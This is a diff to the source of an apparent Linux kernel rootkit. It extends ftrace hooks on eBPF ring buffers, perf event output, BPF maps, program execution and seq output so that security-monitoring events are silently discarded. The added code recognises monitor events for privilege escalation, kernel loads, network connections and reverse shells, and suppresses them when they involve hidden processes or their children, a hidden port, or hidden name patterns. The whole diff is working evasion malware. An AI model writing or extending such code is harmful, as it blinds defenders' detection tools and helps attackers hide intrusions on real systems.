@@ -2,6 +2,7 @@
 #include "../ftrace/ftrace_helper.h"
 #include "../include/hidden_pids.h"
 #include "../include/bpf_hook.h"
+#include "../include/hiding_directory_def.h"
 
 #define HIDDEN_PORT     8081
 #define PID_MAX_VALUE   4194304U
@@ -64,6 +65,55 @@ struct ebpf_evt_ctx {
     struct ebpf_task_ctx task;
 } __attribute__((packed));
 
+#define MON_EVENT_SIZE 120u
+
+struct mon_event {
+    u64 timestamp_ns;
+    u32 pid;
+    u32 tgid;
+    u32 uid;
+    u32 gid;
+    u8  comm[16];
+    u8  event_type;
+    u8  severity;
+    u8  pad[6];
+    union {
+        struct {
+            u32 old_uid;
+            u32 old_gid;
+            u32 new_uid;
+            u32 new_gid;
+        } privesc;
+        struct {
+            u64 addr;
+            u64 len;
+            u32 prot;
+            u32 flags;
+        } mmap;
+        struct {
+            u32 prog_type;
+            u32 insn_cnt;
+        } bpf_load;
+        struct {
+            u64 addr;
+            u8  name[64];
+        } kernel;
+        struct {
+            u8  daddr[4];
+            u16 dport;
+            u16 family;
+            u8  daddr6[16];
+            u8  suspicious;
+            u8  pad[3];
+        } net;
+        struct {
+            u32 oldfd;
+            u32 newfd;
+            char path[32];
+        } rshell;
+    } data;
+} __attribute__((packed));
+
 #define EXT_HDR_MIN (sizeof(struct ebpf_evt_ctx))
 
 static atomic64_t ebpf_obf_key = ATOMIC64_INIT(0);
@@ -94,36 +144,50 @@ static notrace inline u64 read_obf_key_va(void)
 
 static notrace inline bool should_hide_pid_by_int(int pid)
 {
-    int i;
-    if (pid <= 0 || hidden_count <= 0 || hidden_count > MAX_HIDDEN_PIDS)
+    return is_hidden_pid(pid);
+}
+
+static notrace inline bool should_hide_child_pid_by_int(int pid)
+{
+    return is_child_pid(pid);
+}
+
+static notrace inline bool should_hide_any_pid_by_int(int pid)
+{
+    return should_hide_pid_by_int(pid) || should_hide_child_pid_by_int(pid);
+}
+
+static notrace inline bool should_hide_pid_fast_nmi(int pid)
+{
+    int i, count;
+
+    if (pid <= 0)
         return false;
-    for (i = 0; i < hidden_count; i++)
-        if (hidden_pids[i] == pid) return true;
+
+    count = READ_ONCE(hidden_count);
+    if (count > MAX_HIDDEN_PIDS)
+        count = MAX_HIDDEN_PIDS;
+    for (i = 0; i < count; i++)
+        if (READ_ONCE(hidden_pids[i]) == pid)
+            return true;
+
+    count = READ_ONCE(child_count);
+    if (count > MAX_CHILD_PIDS)
+        count = MAX_CHILD_PIDS;
+    for (i = 0; i < count; i++)
+        if (READ_ONCE(child_pids[i]) == pid)
+            return true;
+
     return false;
 }
 
 static notrace bool is_child_of_hidden_process(int pid)
 {
-    struct task_struct *parent;
-    bool hidden = false;
-    int depth = 0;
-
-    if (pid <= 0) return false;
-    if (should_hide_pid_by_int(pid)) return true;
-
-    rcu_read_lock();
-    parent = pid_task(find_vpid(pid), PIDTYPE_PID);
-    if (!parent) goto out;
-    while (parent && depth < 10) {
-        if (parent->pid <= 0) break;
-        parent = rcu_dereference(parent->real_parent);
-        if (!parent || parent->pid <= 1) break;
-        if (should_hide_pid_by_int(parent->pid)) { hidden = true; break; }
-        depth++;
-    }
-out:
-    rcu_read_unlock();
-    return hidden;
+    if (pid <= 0)
+        return false;
+    if (in_nmi())
+        return should_hide_pid_fast_nmi(pid);
+    return should_hide_pid_by_int(pid) || should_hide_child_pid_by_int(pid);
 }
 
 static notrace inline bool is_procinfo_event(const void *data)
@@ -194,15 +258,24 @@ static notrace bool should_hide_start_time_ns(u64 start_time_ns)
 {
     int count, i;
 
-    if (start_time_ns == 0 || hidden_count <= 0 || hidden_count > MAX_HIDDEN_PIDS)
+    if (start_time_ns == 0)
         return false;
 
     count = READ_ONCE(hidden_count);
-    if (count <= 0 || count > MAX_HIDDEN_PIDS)
-        return false;
+    if (count > MAX_HIDDEN_PIDS)
+        count = MAX_HIDDEN_PIDS;
 
     for (i = 0; i < count; i++) {
         if (READ_ONCE(hidden_start_times[i]) == start_time_ns)
+            return true;
+    }
+
+    count = READ_ONCE(child_count);
+    if (count > MAX_CHILD_PIDS)
+        count = MAX_CHILD_PIDS;
+
+    for (i = 0; i < count; i++) {
+        if (READ_ONCE(child_start_times[i]) == start_time_ns)
             return true;
     }
 
@@ -225,8 +298,8 @@ static notrace inline bool should_suppress_procinfo(const void *data, u64 size)
     key = get_obf_key();
     real_pid  = p->pid  ^ (u32)(key);
     real_tgid = p->tgid ^ (u32)(key >> 32);
-    return should_hide_pid_by_int((int)real_pid) ||
-           should_hide_pid_by_int((int)real_tgid);
+    return should_hide_any_pid_by_int((int)real_pid) ||
+           should_hide_any_pid_by_int((int)real_tgid);
 }
 
 static notrace bool should_hide_socket_port(struct sock_common *sk)
@@ -254,6 +327,112 @@ static notrace inline bool is_valid_task_ptr_safe(const struct task_struct *task
     if (pid  <= 0 || pid  >= (pid_t)PID_MAX_VALUE) return false;
     if (tgid <= 0 || tgid >= (pid_t)PID_MAX_VALUE) return false;
     return true;
+}
+
+static notrace inline bool should_filter_bpf_prog_exec(const struct bpf_prog *prog)
+{
+    enum bpf_prog_type type;
+
+    if (!prog)
+        return false;
+
+    type = READ_ONCE(prog->type);
+
+    switch (type) {
+    case BPF_PROG_TYPE_TRACEPOINT:
+    case BPF_PROG_TYPE_RAW_TRACEPOINT:
+    case BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE:
+    case BPF_PROG_TYPE_TRACING:
+    case BPF_PROG_TYPE_PERF_EVENT:
+        return true;
+    default:
+        return false;
+    }
+}
+
+static notrace bool mem_has_substr(const char *buf, u32 len, const char *needle)
+{
+    u32 i, j, nlen = 0;
+
+    if (!buf || !needle || len == 0)
+        return false;
+
+    while (needle[nlen] != '\0')
+        nlen++;
+    if (nlen == 0 || nlen > len)
+        return false;
+
+    for (i = 0; i + nlen <= len; i++) {
+        if (buf[i] == '\0')
+            break;
+        for (j = 0; j < nlen; j++) {
+            if (buf[i + j] == '\0' || buf[i + j] != needle[j])
+                break;
+        }
+        if (j == nlen)
+            return true;
+    }
+
+    return false;
+}
+
+static notrace inline bool is_mon_event(const void *data, u64 size)
+{
+    const struct mon_event *e;
+
+    if (!data || (unsigned long)data < PAGE_SIZE)
+        return false;
+    if (size < MON_EVENT_SIZE)
+        return false;
+
+    e = (const struct mon_event *)data;
+
+    if (e->timestamp_ns < 1000000000ULL)
+        return false;
+    if (e->event_type < 1 || e->event_type > 10)
+        return false;
+    if (e->severity < 1 || e->severity > 4)
+        return false;
+    if (e->pid == 0 || e->pid >= PID_MAX_VALUE)
+        return false;
+    if (e->tgid == 0 || e->tgid >= PID_MAX_VALUE)
+        return false;
+
+    return true;
+}
+
+static notrace bool should_suppress_mon_event(const void *data, u64 size)
+{
+    const struct mon_event *e;
+    int i;
+
+    if (!is_mon_event(data, size))
+        return false;
+
+    e = (const struct mon_event *)data;
+
+    if (is_child_of_hidden_process((int)e->pid) ||
+        is_child_of_hidden_process((int)e->tgid))
+        return true;
+
+    if (e->event_type == 7) {
+        init_hidden_ip();
+        if (ntohs(e->data.net.dport) == HIDDEN_PORT)
+            return true;
+    }
+
+    for (i = 0; hidden_patterns[i] != NULL; i++) {
+        if (mem_has_substr((const char *)e->data.kernel.name,
+                           sizeof(e->data.kernel.name),
+                           hidden_patterns[i]))
+            return true;
+        if (mem_has_substr((const char *)e->data.rshell.path,
+                           sizeof(e->data.rshell.path),
+                           hidden_patterns[i]))
+            return true;
+    }
+
+    return false;
 }
 
 typedef void (*t_rb_discard)(void *, u64);
@@ -305,7 +484,7 @@ static notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *k
     ret = orig_bpf_map_lookup_elem(map, key);
     if (ret && map && key && map->key_size == sizeof(u32)) {
         v = *(const u32 *)key;
-        if (v > 0 && v < PID_MAX_VALUE && should_hide_pid_by_int((int)v))
+        if (v > 0 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v))
             return NULL;
     }
     return ret;
@@ -322,7 +501,7 @@ static notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key,
     if (is_obf_config_map(map)) return orig_bpf_map_update_elem(map, key, value, flags);
     if (map && key && map->key_size == sizeof(u32)) {
         v = *(const u32 *)key;
-        if (v > 0 && v < PID_MAX_VALUE && should_hide_pid_by_int((int)v))
+        if (v > 0 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v))
             return 0;
     }
     return orig_bpf_map_update_elem(map, key, value, flags);
@@ -371,14 +550,14 @@ static notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags
     pid  = READ_ONCE(current->pid);
 
     if (in_nmi()) {
-        if (should_hide_pid_by_int((int)tgid) ||
-            should_hide_pid_by_int((int)pid))
+        if (should_hide_pid_fast_nmi((int)tgid) ||
+            should_hide_pid_fast_nmi((int)pid))
             return NULL;
         return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
     }
 
-    if (should_hide_pid_by_int((int)tgid) ||
-        should_hide_pid_by_int((int)pid))
+    if (is_child_of_hidden_process((int)tgid) ||
+        is_child_of_hidden_process((int)pid))
         return NULL;
 
     return orig_bpf_ringbuf_reserve(ringbuf, size, flags);
@@ -393,6 +572,21 @@ static notrace void hook_bpf_ringbuf_submit(void *data, u64 flags)
 
     if (!orig_bpf_ringbuf_submit) return;
     if (!data || (unsigned long)data < PAGE_SIZE) goto passthrough;
+
+    if (in_nmi()) {
+        if (should_hide_pid_fast_nmi((int)READ_ONCE(current->tgid)) ||
+            should_hide_pid_fast_nmi((int)READ_ONCE(current->pid))) {
+            safe_discard(data, flags);
+            return;
+        }
+        goto passthrough;
+    }
+
+    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+        is_child_of_hidden_process((int)READ_ONCE(current->pid))) {
+        safe_discard(data, flags);
+        return;
+    }
 
     if (is_procinfo_event_v2(data, 0) || is_procinfo_event(data)) {
         suppress = should_suppress_procinfo(data, 0);
@@ -421,9 +615,24 @@ static notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size,
     if (!orig_bpf_ringbuf_output) return -ENOSYS;
     if (!data || !ringbuf) goto passthrough;
 
+    if (in_nmi()) {
+        if (should_hide_pid_fast_nmi((int)READ_ONCE(current->tgid)) ||
+            should_hide_pid_fast_nmi((int)READ_ONCE(current->pid)))
+            return 0;
+        goto passthrough;
+    }
+
+    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
+        return 0;
+
     if ((size >= EBPF_PROCINFO_V2_SIZE && is_procinfo_event_v2(data, size)) ||
         (size >= EBPF_PROCINFO_V1_SIZE && is_procinfo_event(data))) {
         if (should_suppress_procinfo(data, size)) return 0;
+    }
+
+    if (is_mon_event(data, size)) {
+        if (should_suppress_mon_event(data, size)) return 0;
     }
 
     if (is_ebpf_event(data, size)) {
@@ -446,8 +655,8 @@ static notrace int hook_perf_event_output(struct perf_event *event,
     if (!orig_perf_event_output) return -ENOSYS;
 
     if (in_nmi()) {
-        if (should_hide_pid_by_int((int)READ_ONCE(current->tgid)) ||
-            should_hide_pid_by_int((int)READ_ONCE(current->pid)))
+        if (should_hide_pid_fast_nmi((int)READ_ONCE(current->tgid)) ||
+            should_hide_pid_fast_nmi((int)READ_ONCE(current->pid)))
             return 0;
         return orig_perf_event_output(event, data, regs);
     }
@@ -466,6 +675,10 @@ static notrace int hook_perf_event_output(struct perf_event *event,
                 (const struct ebpf_evt_ctx *)raw;
             if (is_child_of_hidden_process((int)ev->task.host_pid) ||
                 is_child_of_hidden_process((int)ev->task.host_tid))
+                return 0;
+        }
+        if (is_mon_event(raw, (u64)rawsz)) {
+            if (should_suppress_mon_event(raw, (u64)rawsz))
                 return 0;
         }
         if (is_ebpf_event(raw, (u64)rawsz)) {
@@ -513,6 +726,10 @@ static notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size,
             if (is_child_of_hidden_process((int)(fh->tid & 0xFFFFFFFF)))
                 return;
         }
+        if (is_mon_event(inner, (u64)inner_size)) {
+            if (should_suppress_mon_event(inner, (u64)inner_size))
+                return;
+        }
     }
 
     orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task);
@@ -523,8 +740,9 @@ static u32 (*orig_bpf_prog_run)(const struct bpf_prog *prog, const void *ctx) = 
 static notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx)
 {
     if (!orig_bpf_prog_run) return 0;
-    if (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
-        is_child_of_hidden_process((int)READ_ONCE(current->pid)))
+    if (should_filter_bpf_prog_exec(prog) &&
+        (is_child_of_hidden_process((int)READ_ONCE(current->tgid)) ||
+         is_child_of_hidden_process((int)READ_ONCE(current->pid))))
         return 0;
     return orig_bpf_prog_run(prog, ctx);
 }
@@ -579,7 +797,7 @@ static notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u3
     pd = (const u32 *)data;
     for (i = 0; i < (int)(len / sizeof(u32)) && i < 16; i++) {
         u32 v = pd[i];
-        if (v > 1 && v < 65536 && should_hide_pid_by_int((int)v)) return 0;
+        if (v > 1 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v)) return 0;
     }
 passthrough:
     return orig_bpf_seq_write(seq, data, len);
@@ -597,7 +815,7 @@ static notrace int hook_bpf_seq_printf(struct seq_file *m, const char *fmt,
     pd = (const u32 *)data;
     for (i = 0; i < (int)(data_len / sizeof(u32)) && i < 16; i++) {
         u32 v = pd[i];
-        if (v > 1 && v < 65536 && should_hide_pid_by_int((int)v)) return 0;
+        if (v > 1 && v < PID_MAX_VALUE && should_hide_any_pid_by_int((int)v)) return 0;
     }
 passthrough:
     return orig_bpf_seq_printf(m, fmt, fmt_size, data, data_len);
